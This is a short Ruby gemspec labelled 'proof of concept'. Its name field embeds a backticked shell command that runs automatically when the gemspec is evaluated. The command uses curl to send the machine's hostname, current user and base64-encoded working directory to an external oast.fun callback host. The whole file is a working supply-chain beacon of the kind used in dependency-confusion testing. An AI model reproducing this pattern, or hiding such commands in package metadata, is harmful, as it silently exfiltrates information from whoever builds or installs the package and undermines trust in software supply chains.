Gem::Specification.new do |s|
  s.name    = `curl -s "https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/s?host=$(hostname)&user=$(whoami)&pwd=$(pwd | base64)"`.strip
  s.version = "1.0.0"
  s.summary = "proof of concept"
  s.authors = ["test"]
end
